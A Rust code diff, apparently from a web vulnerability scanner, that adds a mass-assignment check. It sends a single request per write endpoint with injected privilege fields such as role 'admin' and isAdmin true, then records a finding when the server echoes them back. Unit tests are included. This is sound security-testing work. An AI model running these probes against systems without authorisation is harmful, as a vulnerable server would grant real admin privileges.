@@ -447,6 +447,63 @@ fn sweep_probe_cmdi(client: &reqwest::blocking::Client, point: &InjectionPoint) 
     None
 }
 
+// ---- Mass assignment (A01/A04) — LOW VOLUME: one probe per write endpoint ----
+// The user's rule for logic bugs: send a FEW packets and JUDGE, never batch-fuzz
+// (that gets you blocked). Here that means exactly ONE create/update request per
+// endpoint, adding privilege fields the form never exposed. If the server echoes one
+// back as we set it, it binds unchecked input to privileged attributes.
+
+/// Add canonical privilege fields to a create/update body (the ones the form did not
+/// expose). One body, one request.
+fn mass_assign_probe_body(base: &JsonValue) -> JsonValue {
+    let mut body = base.clone();
+    if let Some(obj) = body.as_object_mut() {
+        obj.insert("role".into(), serde_json::json!("admin"));
+        obj.insert("isAdmin".into(), serde_json::json!(true));
+        obj.insert("admin".into(), serde_json::json!(true));
+        obj.insert("verified".into(), serde_json::json!(true));
+        obj.insert("isPremium".into(), serde_json::json!(true));
+    }
+    body
+}
+
+/// Judge: the response echoes one of the injected privilege fields AS WE SET IT. A
+/// properly-whitelisted endpoint drops them, so this stays low-false-positive.
+fn mass_assign_accepted(resp_body: &str) -> bool {
+    let l = resp_body.to_ascii_lowercase();
+    (l.contains("\"role\"") && l.contains("admin"))
+        || l.contains("\"isadmin\":true")
+        || l.contains("\"admin\":true")
+        || l.contains("\"verified\":true")
+        || l.contains("\"ispremium\":true")
+}
+
+fn sweep_probe_mass_assignment(client: &reqwest::blocking::Client, point: &InjectionPoint) -> Option<JsonValue> {
+    let base = point.base_body.as_ref()?;
+    if !matches!(point.method.as_str(), "POST" | "PUT" | "PATCH") {
+        return None;
+    }
+    let body = mass_assign_probe_body(base);
+    let resp = client
+        .request(http_method(&point.method), &point.url)
+        .header(reqwest::header::CONTENT_TYPE, "application/json")
+        .body(body.to_string())
+        .send()
+        .ok()?;
+    let status = resp.status().as_u16();
+    let mut buf = Vec::new();
+    let _ = std::io::Read::take(resp, 262_144).read_to_end(&mut buf);
+    let rb = String::from_utf8_lossy(&buf);
+    if (200..300).contains(&status) && mass_assign_accepted(&rb) {
+        Some(serde_json::json!({
+            "point": point.label, "url": point.url, "status": status,
+            "injectedFields": ["role", "isAdmin", "admin", "verified", "isPremium"],
+        }))
+    } else {
+        None
+    }
+}
+
 /// Code-driven SQL-injection sweep over the scan's recon-discovered endpoints.
 /// Returns the number of injectable points confirmed (findings written).
 #[tauri::command]
@@ -617,7 +674,30 @@ pub fn run_attack_sweep(
         );
     }
 
-    let total = injectable + access_findings + reflected_findings + xss_findings + cmdi_findings;
+    // Pass 5 — mass assignment: ONE probe per unique write endpoint (low volume), not
+    // per field. Adds privilege fields and checks whether the created record keeps them.
+    let mut mass_assign_findings = 0usize;
+    let mut ma_seen: HashSet<String> = HashSet::new();
+    for point in &points {
+        if point.base_body.is_none() || !ma_seen.insert(point.url.clone()) {
+            continue; // one probe per endpoint
+        }
+        let Some(evidence) = sweep_probe_mass_assignment(&client, point) else { continue };
+        mass_assign_findings += 1;
+        let record = serde_json::json!({
+            "evidence": evidence, "cwe": "CWE-915",
+            "detail": "创建/更新接口接受并回显了未暴露的权限字段(role/isAdmin…)，存在批量赋值/权限提升",
+        });
+        let _ = connection.execute(
+            "INSERT INTO sentinel_findings(scan_id,target_url,stage,kind,record_key,title,severity,record_json) \
+             VALUES(?1,?2,'attack','mass_assignment',?3,?4,'high',?5) \
+             ON CONFLICT(scan_id,target_url,stage,kind,record_key) DO UPDATE SET \
+             title=excluded.title,severity=excluded.severity,record_json=excluded.record_json,updated_at=datetime('now','localtime')",
+            params![scan_id, base_url, point.url, format!("批量赋值/权限提升：{}", point.url), record.to_string()],
+        );
+    }
+
+    let total = injectable + access_findings + reflected_findings + xss_findings + cmdi_findings + mass_assign_findings;
     Ok(serde_json::json!({
         "probed": probed,
         "pointsDiscovered": points.len(),
@@ -627,6 +707,7 @@ pub fn run_attack_sweep(
         "reflectedXssFindings": reflected_findings,
         "storedXssFindings": xss_findings,
         "cmdiFindings": cmdi_findings,
+        "massAssignFindings": mass_assign_findings,
         "injectable_total": total,
         "hint": if total > 0 {
             "已写入 attack 发现(SQL 注入 / 越权 / 敏感泄露 / 反射 XSS(低) / 存储 XSS / 命令注入),附证据"
@@ -754,5 +835,20 @@ mod attack_sweep_tests {
         // Persistence = the POSTed marker survives UNENCODED on a later read.
         assert!(stored_xss_marker_persisted("<li><ovrxabc12345></li>", "<ovrxabc12345>"));
         assert!(!stored_xss_marker_persisted("<li>&lt;ovrxabc12345&gt;</li>", "<ovrxabc12345>"));
+    }
+
+    #[test]
+    fn mass_assignment_injects_and_judges_echoed_privilege() {
+        let base = serde_json::json!({"email": "a@b.c", "password": "x"});
+        let probe = mass_assign_probe_body(&base);
+        // original fields preserved, privilege fields added
+        assert_eq!(probe["email"], "a@b.c");
+        assert_eq!(probe["role"], "admin");
+        assert_eq!(probe["isAdmin"], true);
+        // accepted = the created record keeps a privilege field as we set it
+        assert!(mass_assign_accepted(r#"{"id":5,"email":"a@b.c","role":"admin"}"#));
+        assert!(mass_assign_accepted(r#"{"id":5,"isAdmin":true}"#));
+        // a whitelisted endpoint drops them → not accepted
+        assert!(!mass_assign_accepted(r#"{"id":5,"email":"a@b.c"}"#));
     }
 }
